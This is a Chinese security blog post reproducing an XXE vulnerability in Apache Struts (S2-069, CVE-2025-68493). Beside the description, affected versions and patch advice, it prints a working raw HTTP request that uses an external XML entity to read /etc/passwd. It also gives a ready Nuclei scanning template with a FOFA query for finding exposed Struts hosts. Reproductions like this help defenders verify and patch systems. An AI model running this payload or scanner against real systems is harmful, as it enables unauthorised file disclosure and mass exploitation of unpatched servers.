#  【漏洞复现】Apache Struts S2-069 XXE漏洞 CVE-2025-68493  
原创 YGnight
                        YGnight  night安全   2026-01-16 00:04  
  
公众号新规  
只对常读  
和  
星标的公众号才能展示大图推送，  
建议大家把公众号“  
n  
i  
g  
h  
t  
安  
全  
”设为  
星  
标  
，  
否  
则  
可  
能  
就  
看  
不  
到  
啦  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6sHg0pvRw6MpQSvVF3CeJ83RS0Ys1YBXC1vM6icvsxKialdwur2lAFAsQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6kXG7JA6Rbic2FFaqy9dPWrQlwfRNCPfyicibm6Evv39Z6VttiagBARRQgw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif "")  
  
  
  
night安全致力于分享技术学习和工具掌握。然而请注意不得将此用于任何未经授权的非法行为，请您严格遵守国家信息安全法律法规。任何违反法律、法规的行为，均与本人无关。如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞描述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
    Apache Struts是美国阿帕奇（Apache）基金会的一个开源项目，是一套用于创建企业级Java  Web应用的开源MVC框架，主要提供两个版本框架产品，Struts 1和Struts 2。 XWork 组件在解析 XML 配置时，未对 XML 进行严格的验证和安全配置，导致存在 XML 外部实体注入 (XXE) 漏洞。攻击者可以构造恶意的 XML 实体，从而实现任意文件读取、拒绝服务 (DoS) 或服务端请求伪造 (SSRF)。  
  
官方通告：  
  
https://cwiki.apache.org/confluence/display/WW/S2-069  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhLOXia2TVkSrQGhlBJAqJRxGesf8Jh3dE2uHTxWDxsQFcSSvibt9HYrvpvVDMTXH9Rd53luiaob4how/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
```
Struts 2.0.0 至 2.3.37
Struts 2.5.0 至 2.5.33
Struts 6.0.0 至 6.1.0
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
```
POST/struts2-xml-parser/xmlParserNoDtdParseHTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/143.0.0.0Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhLOXia2TVkSrQGhlBJAqJRxtR6qX1iaLqmgArZbGmg8YoPJBoic7JShJKA0ibdbGbAWGia46gznaMac2g/640?wx_fmt=png&from=appmsg "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=12 "")  
  
NUCLEI POC  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhLOXia2TVkSrQGhlBJAqJRxLb9eMxXalgVyKvNRphIIFJKEA0ibDw8G2WIvu78gcNo1lOpmiaM8rpRw/640?wx_fmt=png&from=appmsg "")  
  
  
```
id: CVE-2025-68493-Struts-S2-069-XXE
info:
  name: Apache_Struts_S2-069_XXE漏洞_CVE-2025-68493
  author: night安全
  severity: high
  description: description
  reference:
    - https://
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="Struts"
  tags: Struts
http:
  - raw:
      - |-
        @timeout: 30s
        POST /struts2-xml-parser/xmlParserNoDtdParse HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        <?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'root:x'
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
修复建议  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
```
官方已推送更新版本，受影响用户可以升级至Apache Struts 6.1.1 或更高版本。

临时修复方案：
1.使用自定义SAXParserFactory：将xwork.saxParserFactory= 设置为 默认禁用外部实体的自定义工厂类
2. 定义 JVM 级别配置 ：
配置 JVM 默认的 XML 解析器，通过 系统属性禁用外部实体（设置为空字符串以阻止所有协议）：
-Djavax.xml.accessExternalDTD=""
-Djavax.xml.accessExternalSchema=""
-Djavax.xml.accessExternalStylesheet=""
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKpciaqHNr4Y60SPF1XeS358wiceQDUm8K5zh7RZsnknYxKJ37kkkcpWZg/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6DCLEF53OGJWH7A9YU8LA95g10yEzvZgFYhwhV3OQX3qdtk7vIsWncw/640?wx_fmt=png&from=appmsg "")  
  
****  
扫  
码  
关  
注  
  
获  
得  
更  
多  
资  
讯  
  
****  
  
  
